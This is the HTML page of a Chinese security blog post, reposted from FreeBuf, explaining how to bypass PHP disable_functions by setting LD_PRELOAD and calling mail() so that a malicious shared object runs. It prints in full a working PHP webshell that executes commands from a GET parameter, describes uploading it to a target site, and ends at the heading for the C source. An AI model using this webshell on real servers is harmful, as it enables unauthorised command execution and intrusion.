@@ -1,0 +1,256 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>巧用LD_PRELOAD突破disable_functions | Rick</title><meta name="author" content="LYC"><meta name="copyright" content="LYC"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;192052.html 通常来说，导致 webshell 不能执行命令的原因大概有三类：一是 php.ini 中用 disable_functions  指示器禁用了 system()、exec() 等等这类命令执行的相关函数；二是 web 进程运行在 rbash 这类受限 shell  环境中；三是 WAF 拦劫。若是一则">
+<meta property="og:type" content="article">
+<meta property="og:title" content="巧用LD_PRELOAD突破disable_functions">
+<meta property="og:url" content="http://991688344.github.io/2020/04/09/%E5%B7%A7%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions/index.html">
+<meta property="og:site_name" content="Rick">
+<meta property="og:description" content="https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;192052.html 通常来说，导致 webshell 不能执行命令的原因大概有三类：一是 php.ini 中用 disable_functions  指示器禁用了 system()、exec() 等等这类命令执行的相关函数；二是 web 进程运行在 rbash 这类受限 shell  环境中；三是 WAF 拦劫。若是一则">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://991688344.github.io/images/Wallpaper/rainbowcat.gif">
+<meta property="article:published_time" content="2020-04-09T01:50:02.000Z">
+<meta property="article:modified_time" content="2024-03-19T01:32:36.466Z">
+<meta property="article:author" content="LYC">
+<meta property="article:tag" content="安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://991688344.github.io/images/Wallpaper/rainbowcat.gif"><link rel="shortcut icon" href="/images/Wallpaper/favicon.ico"><link rel="canonical" href="http://991688344.github.io/2020/04/09/%E5%B7%A7%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/content.json","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '巧用LD_PRELOAD突破disable_functions',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  isShuoshuo: false
+}</script><link rel="stylesheet" href="/mycss/my_background.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-color: #F7F9FE;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">251</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">37</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">49</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/images/Wallpaper/rainbowcat.gif);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Rick</span></a><a class="nav-page-title" href="/"><span class="site-name">巧用LD_PRELOAD突破disable_functions</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">巧用LD_PRELOAD突破disable_functions</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-04-09T01:50:02.000Z" title="发表于 2020-04-09 09:50:02">2020-04-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-03-19T01:32:36.466Z" title="更新于 2024-03-19 09:32:36">2024-03-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">2.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>10分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/192052.html">https://www.freebuf.com/articles/web/192052.html</a></p>
+<p>通常来说，导致 webshell 不能执行命令的原因大概有三类：一是 php.ini 中用 disable_functions  指示器禁用了 system()、exec() 等等这类命令执行的相关函数；二是 web 进程运行在 rbash 这类受限 shell  环境中；三是 WAF 拦劫。若是一则无法执行任何命令，若是二、三则可以执行少量命令。从当前现象来看，很可能由 disable_functions 所致。为验证，我利用前面的 RCE 漏洞执行 phpinfo()，确认的确如此：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20181215/1544880230_5c150066ae2af.png"><img src="/2020/04/09/%E5%B7%A7%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions/1544880230_5c150066ae2af.png!small" alt="image.png"></a>有四种绕过 disable_functions 的手法：第一种，攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick  的魔图漏洞、bash 的破壳漏洞；第二种，寻找未禁用的漏网函数，常见的执行命令的函数有  system()、exec()、shell_exec()、passthru()，偏僻的     popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼；第三种，mod_cgi 模式，尝试修改  .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制；第四种，利用环境变量 LD_PRELOAD  劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。</p>
+<p>尝试第一种时，我用 phpinfo() 查看 ImageMagick 版本为 v6.9.4-10：<a target="_blank" rel="noopener" href="https://image.3001.net/images/20181215/1544880247_5c15007780479.png"><img src="/2020/04/09/%E5%B7%A7%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions/1544880247_5c15007780479.png!small" alt="image.png"></a></p>
+<p>用 searchsploit（<a target="_blank" rel="noopener" href="http://exploit-db.com">exploit-db.com</a> 的本地版）搜索存在命令注入的版本为 v6.9.3-9 或 v7.0.1-0：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20181215/1544880268_5c15008ca5d03.png"><img src="/2020/04/09/%E5%B7%A7%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions/1544880268_5c15008ca5d03.png!small" alt="image.png"></a>显然，当前 ImageMagick 无法利用；尝试第二种时，常见的、不常见的、罕见的（如 dl()），所有可启动进程的函数均被禁用；尝试第三种时，发现并未启用 mod_cgi 模式。所有希望，寄托在 LD_PRELOAD。</p>
+<p>设想这样一种思路：利用漏洞控制 web 启动新进程 a.bin（即便进程名无法让我随意指定），a.bin 内部调用系统函数 b()，b() 位于系统共享对象 <a target="_blank" rel="noopener" href="http://c.so">c.so</a> 中，所以系统为该进程加载共 <a target="_blank" rel="noopener" href="http://c.so">c.so</a>，我想法在 <a target="_blank" rel="noopener" href="http://c.so">c.so</a> 前优先加载可控的 c_evil.so，c_evil.so 内含与 b() 同名的恶意函数，由于 c_evil.so 优先级较高，所以，a.bin 将调用到 c_evil.so 内 b() 而非系统的  <a target="_blank" rel="noopener" href="http://c.so">c.so</a> 内 b()，同时，c_evil.so 可控，达到执行恶意代码的目的。基于这一思路，将突破    disable_functions  限制执行操作系统命令这一目标，大致分解成几步在本地推演：查看进程调用系统函数明细、操作系统环境下劫持系统函数注入代码、找寻内部启动新进程的  PHP 函数、PHP 环境下劫持系统函数注入代码。</p>
+<p>查看进程调用系统函数明细。linux 创建新进程的过程较为复杂，我关心进程加载了哪些共享对象、可能调用哪些 API、实际调用了哪些 API。比如，运行 /usr/bin/id，通过 ldd 可查看系统为其加载的共享对象：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20181215/1544880281_5c15009921d27.png"><img src="/2020/04/09/%E5%B7%A7%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions/1544880281_5c15009921d27.png!small" alt="image.png"></a>由于可执行文件 /usr/bin/id 内含符号表，所以，运行 nm -D /usr/bin/id 2&gt;&amp;1 或 readelf -Ws /usr/bin/id 可查看该程序可能调用的系统 API 明细：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20181215/1544880287_5c15009f70c19.png"><img src="/2020/04/09/%E5%B7%A7%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions/1544880287_5c15009f70c19.png!small" alt="image.png"></a>由于程序运行时会根据命令行选项、运行环境作出不同反应，导致真正运行时调用的 API 可能只是 readefl 查看的子集，你可以运行 strace -f /usr/bin/id 2&gt;&amp;1 跟踪实际 API 调用情况，比如，实际调用 open()    的入参、返回值一目了然：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20181215/1544880293_5c1500a5009b7.png"><img src="/2020/04/09/%E5%B7%A7%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions/1544880293_5c1500a5009b7.png!small" alt="image.png"></a>操作系统环境下劫持系统函数注入代码。linux 的环境变量 LD_PRELOAD 是一种类似 win32 API hook 的更优雅的实现，适用于打热补丁、读取进程空间数据、禁止程序调用指定 API、调试程序等等场景，甚至可以在不更改原始可执行文件前提下植入后门（管理员常用的     /bin/ps）。由于被劫持的系统函数得由我们重新实现一次，函数原型必须一致，为减少复杂性，我会选择劫持那些无参数且常用的系统函数，getuid() 就适合，以此为例，完整劫持过程步骤大致如下：首先，用 man 2 getuid 查看函数原型：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20181215/1544880299_5c1500ab3183e.png"><img src="/2020/04/09/%E5%B7%A7%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions/1544880299_5c1500ab3183e.png!small" alt="image.png"></a>然后，编写同原型的 getuid() 函数，保存至 getuid_shadow.c，源码为：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20181215/1544880307_5c1500b3bfa13.png"><img src="/2020/04/09/%E5%B7%A7%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions/1544880307_5c1500b3bfa13.png!small" alt="image.png"></a>执行 gcc -shared -fPIC getuid_shadow.c -o getuid_shadow.so 将其编译为共享对象：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20181215/1544880312_5c1500b8e5106.png"><img src="/2020/04/09/%E5%B7%A7%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions/1544880312_5c1500b8e5106.png!small" alt="image.png"></a>最后，借助环境变量 LD_PRELOAD 劫持系统函数 getuid()，获取控制权。执行 LD_PRELOAD=/root/getuid_shadow.so /usr/bin/id，注入代码成功执行：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20181215/1544880336_5c1500d0e9bd7.png"><img src="/2020/04/09/%E5%B7%A7%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions/1544880336_5c1500d0e9bd7.png!small" alt="image.png"></a>注意，LD_PRELOAD 是进程独占环境变量，类似于命令适配器，它与待执行命令间必须为空白字符，而非命令分隔符（;、&amp;&amp;、||）。</p>
+<p>找寻内部启动新进程的 PHP 函数。虽然 LD_PRELOAD 为我提供了劫持系统函数的能力，但前提是我得控制 php  启动外部程序才行（只要有进程启动行为即可，无所谓是谁）。常见的 system() 启动程序方式显然不行，否则就不存在突破  disable_functions 一事了。PHP 脚本中除了调用 system()、exec()、shell_exec() 等等一堆 php  函数外，还有哪种可能启动外部程序呢？php 解释器自身！比如，php 函数 goForward() 实现“前进”的功能，php    函数  goForward() 又由组成 php 解释器的 C 语言模块之一的 move.c 实现，C 模块 move.c 内部又通过调用外部程序  go.bin 实现，那么，我的 php 脚本中调用了函数 goForward()，势必启动外部程序 go.bin。现在，我需要找到类似  goForward() 的真实存在的 PHP  函数。印象中，处理图片、请求网页、发送邮件等三类场景中可能存在我想要的函数，我得逐一验证。处理图片，通常调用 PHP 封装的  ImageMagick 库，新建 image.php，调用    Imagick()：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20181215/1544880344_5c1500d8a90fc.png"><img src="/2020/04/09/%E5%B7%A7%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions/1544880344_5c1500d8a90fc.png!small" alt="image.png"></a>运行 strace -f php image.php 2&gt;&amp;1 | grep -A2 -B2 execve 查看 Imagick() 是否启动新进程：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20181215/1544880349_5c1500dd492a1.png"><img src="/2020/04/09/%E5%B7%A7%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions/1544880349_5c1500dd492a1.png!small" alt="image.png"></a>第一个 execve 是启动 PHP 解释器而已，必须找到第二个 execve，没有则说明并未启动新进程；请求网页，新建 http.php，调用 curl_init()：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20181215/1544880355_5c1500e300c6f.png"><img src="/2020/04/09/%E5%B7%A7%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions/1544880355_5c1500e300c6f.png!small" alt="image.png"></a>运行 strace -f php http.php 2&gt;&amp;1 | grep -A2 -B2 execve 查看 curl_init() 是否启动新进程：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20181215/1544880360_5c1500e843124.png"><img src="/2020/04/09/%E5%B7%A7%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions/1544880360_5c1500e843124.png!small" alt="image.png"></a>仍然不是我要的；发送邮件，新建 mail.php，调用 mail()：</p>
+<p><img src="/2020/04/09/%E5%B7%A7%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions/1544880369_5c1500f1323d3.png!small" alt="image.png">运行 strace -f php mail.php 2&gt;&amp;1 | grep -A2 -B2 execve 查看 mail() 是否启动新进程：<img src="/2020/04/09/%E5%B7%A7%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions/1544881466_5c15053aceadf.png!small" alt="image.png">bingo！mail() 内部启动了 /usr/sbin/sendmail、/usr/sbin/postdrop 两个新进程，它就是我一直苦寻的函数（用相同的测试方式，还找到一个 imap_mail()）。</p>
+<p>PHP 环境下劫持系统函数注入代码。mail.php 内增加设置 LD_PRELOAD 的代码：</p>
+<p><img src="/2020/04/09/%E5%B7%A7%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions/image-20200409114347679.png" alt="image-20200409114347679"></p>
+<p>然后将 mail.php 以及内含 mail() 函数的共享对象 getuid_shadow.so 放入 web 目录 /var/www/：</p>
+<p><img src="/2020/04/09/%E5%B7%A7%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions/1544880392_5c15010861a0e.png!small" alt="image.png">执行 mail.php 之后，找到 getuid_shadow.so 中 mail() 创建的文件 /tmp/evil，成功在 PHP 环境下不借助任何 PHP 命令执行函数执行命令：</p>
+<p><img src="/2020/04/09/%E5%B7%A7%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions/1544880398_5c15010e41609.png!small" alt="image.png">有了前面的分析，看我如何在目标站点绕过 disable_functions 执行系统命令。</p>
+<p>首先，基于前面的 mail.php 写了个小马 bypass_disablefunc.php：<img src="/2020/04/09/%E5%B7%A7%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions/1544882796_5c150a6cedcef.png!small" alt="image.png"></p>
+<p>bypass_disablefunc.php 提供三个 GET 参数。一是 cmd 参数，待执行的系统命令（如 pwd）；二是  outpath 参数，保存命令执行输出结果的文件路径（如 /tmp/xx），便于在页面上显示，另外关于该参数，你应注意 web  是否有读写权限、web 是否可跨目录访问、文件将被覆盖和删除等几点；三是 sopath 参数，指定劫持系统函数的共享对象的绝对路径（如  /var/www/bypass_disablefunc_x64.so），另外关于该参数，你应注意 web  是否可跨目录访问到它。此外，bypass_disablefunc.php    拼接命令和输出路径成为完整的命令行，所以你不用在 cmd  参数中重定向了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;</span><br></pre></td></tr></table></figure>
+<p>同时，通过环境变量 EVIL_CMDLINE 向 bypass_disablefunc_x64.so 传递具体执行的命令行信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);</span><br></pre></td></tr></table></figure>
+<p>然后，基于 getuid_shadow.c 编写劫持函数的代码 bypass_disablefunc.c。回想下，先前我之所以劫持  getuid()，是因为 sendmail 程序会调用该函数，在真实环境中，存在两方面问题：一是，某些环境中，web 禁止启用  senmail、甚至系统上根本未安装 sendmail，也就谈不上劫持 getuid()，通常的 www-data 权限又不可能去更改  php.ini 配置、去安装 sendmail 软件；二是，即便目标可以启用 sendmail，由于未将主机名（hostname     输出）添加进 hosts 中，导致每次运行 sendmail 都要耗时半分钟等待域名解析超时返回，www-data 也无法将主机名加入  hosts（如，127.0.0.1   lamp、lamp.、<a target="_blank" rel="noopener" href="http://lamp.com">lamp.com</a>）。基于这两个原因，我不得不放弃劫持函数  getuid()，必须找个更普适的方法。回到 LD_PRELOAD  本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那我就完全可以不依赖 sendmail    了。这种场景与 C++ 的构造函数简直神似！几经搜索后了解到，GCC 有个 C 语言扩展修饰符  <strong>attribute</strong>((constructor))，可以让由它修饰的函数在 main()  之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <strong>attribute</strong>((constructor))  修饰的函数。</p>
+<blockquote>
+<p>首先php设置好 LD_PRELOAD, 然后调用mail()</p>
+<p>mail中会启动新的进程(例如 sendmail, postdrop),新的进程会加载 LD_PRELOAD</p>
+<p>LD_PRELOAD中bypass_disablefunc.so文件中定义了 attribute</p>
+<p>所以 新进程的main函数调用前会先调用我们的恶意代码</p>
+</blockquote>
+<p>强调下，这一细节非常重要，很多朋友用 LD_PRELOAD 手法突破 disable_functions  无法做到百分百成功，正因为这个原因，我们<strong>不要局限于仅劫持某一函数，而应考虑劫持共享对象</strong>。bypass_disablefunc.c    源码如下：</p>
+<p><img src="/2020/04/09/%E5%B7%A7%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions/1544880416_5c15012019240.png!small" alt="image.png">从环境变量 EVIL_CMDLINE 中接收 bypass_disablefunc.php 传递过来的待执行的命令行。</p>
+<p>接着，用命令 <code>gcc -shared -fPIC bypass_disablefunc.c -o  bypass_disablefunc_x64.so</code> 将 bypass_disablefunc.c 编译为共享对象  bypass_disablefunc_x64.so：</p>
+<p><img src="/2020/04/09/%E5%B7%A7%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions/1544880538_5c15019a6faee.png!small" alt="image.png">你要根据目标架构编译成不同版本，在 x64 的环境中编译，若不带编译选项则默认为 x64，若要编译成 x86 架构需要加上 -m32 选项。</p>
+<p>最后，用菜刀将 bypass_disablefunc.php 和 bypass_disablefunc_x64.so 传到目标：</p>
+<p><img src="/2020/04/09/%E5%B7%A7%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions/1544880550_5c1501a61f5e4.png!small" alt="image.png">指定好命令输出路径、共享对象路径后，在 bypass_disablefunc.php 上再次执行先前失败的命令 cat /proc/meminfo：</p>
+<p><img src="/2020/04/09/%E5%B7%A7%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions/1544880558_5c1501aeceea4.png!small" alt="image.png">啊哈！很酷对不对。</p>
+<p>好了，巧用 LD_PRELOAD 突破 disable_functions 的手法就是这样子，唯一条件，PHP  支持putenv()、mail() 即可，甚至无需安装  sendmail。那么，现在的情况是，我知道你很忙，没时间看前面的技术细节，要的只是开箱即用的工具。行，bypass_disablefunc.php、bypass_disablefunc.c、bypass_disablefunc_x64.so 托管在 <a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD%EF%BC%8C%E8%87%AA%E5%8F%96%E3%80%82">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD，自取。</a></p>
+<p>bypassdisablefunc.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">    <span class="variable">$out_path</span> = <span class="variable">$_GET</span>[<span class="string">&quot;outpath&quot;</span>];</span><br><span class="line">    <span class="variable">$evil_cmdline</span> = <span class="variable">$cmd</span> . <span class="string">&quot; &gt; &quot;</span> . <span class="variable">$out_path</span> . <span class="string">&quot; 2&gt;&amp;1&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot;</span> . <span class="variable">$evil_cmdline</span> . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;EVIL_CMDLINE=&quot;</span> . <span class="variable">$evil_cmdline</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$so_path</span> = <span class="variable">$_GET</span>[<span class="string">&quot;sopath&quot;</span>];</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=&quot;</span> . <span class="variable">$so_path</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mail</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot;</span> . <span class="title function_ invoke__">nl2br</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$out_path</span>)) . <span class="string">&quot;&lt;/p&gt;&quot;</span>; </span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$out_path</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>bypass_disablefunc.c</p>
